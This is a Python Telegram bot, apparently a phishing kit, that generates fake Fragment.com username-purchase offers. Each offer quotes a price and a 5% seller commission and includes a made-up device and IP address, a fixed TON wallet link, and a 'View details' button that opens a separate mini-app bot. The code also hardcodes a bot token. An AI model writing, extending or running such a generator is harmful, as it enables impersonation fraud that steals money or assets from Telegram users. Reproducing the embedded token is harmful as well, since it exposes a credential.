import os
import time
import urllib.request
import json
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"🤖 Fragment Deal Generator v2.6 - SIMPLE")
print(f"🗝️ Bot Token: ✅")
print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
print(f"📡 Port: {PORT}")

# Variables globales
bot_status = "STARTING"

# ===== SERVEUR HTTP SIMPLE =====
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        
        response = f"""Fragment Bot Status: {bot_status}
Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}
Port: {PORT}
Ready: OK"""
        
        self.wfile.write(response.encode())
    
    def log_message(self, format, *args):
        pass

def http_server():
    """Serveur HTTP simple en thread"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), SimpleHandler)
        print(f"✅ HTTP Server: PORT {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ HTTP Error: {e}")

# ===== PRIX TON =====
def get_ton_price():
    """Prix TON simplifié"""
    try:
        url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            return float(data.get('Price', 5.50))
    except:
        return 5.50

# ===== COMMANDES BOT =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start simplifiée"""
    print(f"📥 START command from user {update.effective_user.id}")
    
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator v2.6**

Hello {user.first_name}! 👋

**Your Chat ID:** `{chat_id}`

**Commands:**
• `/create username price` - Generate Fragment deal
• `/help` - Show help

**Example:**
`/create crypto 1500`

✅ **Bot is ready to work!**"""
        
        await update.message.reply_text(
            message,
            parse_mode='Markdown'
        )
        
        print(f"✅ START response sent to {chat_id}")
        
    except Exception as e:
        print(f"❌ START error: {e}")
        await update.message.reply_text("❌ Error occurred, please try again.")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create simplifiée"""
    print(f"📥 CREATE command: {context.args}")
    
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Wrong format!**\n\n"
                "Use: `/create username price`\n"
                "Example: `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
        
        username = str(context.args[0]).strip().replace('@', '').upper()
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Price must be a number!")
            return
        
        if price <= 0 or price > 1000000:
            await update.message.reply_text("❌ Price must be between 0 and 1,000,000 TON")
            return
        
        # Calculs
        commission = price * 0.05
        ton_price = get_ton_price()
        price_usd = price * ton_price
        commission_usd = commission * ton_price
        
        # Message Fragment
        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
        
        # Bouton
        button_url = f"https://t.me/BidRequestMiniApp_bot/WebApp?startapp={username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Envoi
        await update.message.reply_text(
            fragment_message,
            reply_markup=reply_markup,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        # Confirmation
        await update.message.reply_text(
            f"✅ **Deal Created!**\n\n"
            f"Username: @{username}\n"
            f"Price: {price:g} TON (${price_usd:.2f})\n"
            f"TON Price: ${ton_price:.2f}",
            parse_mode='Markdown'
        )
        
        print(f"✅ Deal created: @{username} - {price} TON")
        
    except Exception as e:
        print(f"❌ CREATE error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /help"""
    print(f"📥 HELP command from {update.effective_user.id}")
    
    help_text = """📖 **Fragment Deal Generator Help**

**Commands:**
• `/start` - Start the bot
• `/create username price` - Create Fragment deal
• `/help` - Show this help

**Examples:**
• `/create crypto 1500`
• `/create bitcoin 2000.5`

**Features:**
• 💎 Real-time TON price
• 💰 Automatic USD conversion  
• 🧮 5% commission calculation
• 🔗 Clickable TON wallet
• 📱 Integrated WebApp button

✅ **Ready to generate Fragment deals!**"""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')
    print("✅ HELP sent")

# ===== FONCTION PRINCIPALE =====
async def main():
    """Fonction principale simplifiée"""
    global bot_status
    
    try:
        print("🚀 Starting Telegram Bot...")
        
        # 1. HTTP Server en thread
        http_thread = threading.Thread(target=http_server, daemon=True)
        http_thread.start()
        print("✅ HTTP thread started")
        
        # 2. Bot Telegram
        print("🤖 Creating Telegram Application...")
        
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des commandes
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("✅ Handlers added")
        
        # Test de connexion
        print("🔍 Testing connection...")
        bot = await app.bot.get_me()
        print(f"✅ Connected to: @{bot.username}")
        
        bot_status = "RUNNING"
        
        # Démarrage du polling
        print("🔄 Starting polling...")
        await app.run_polling(
            poll_interval=1.0,
            timeout=10,
            bootstrap_retries=3,
            read_timeout=10,
            write_timeout=10,
            connect_timeout=10,
            pool_timeout=10
        )
        
    except Exception as e:
        print(f"❌ MAIN ERROR: {e}")
        bot_status = "ERROR"
        raise

if __name__ == '__main__':
    print("🎯 Starting Fragment Deal Generator...")
    asyncio.run(main())
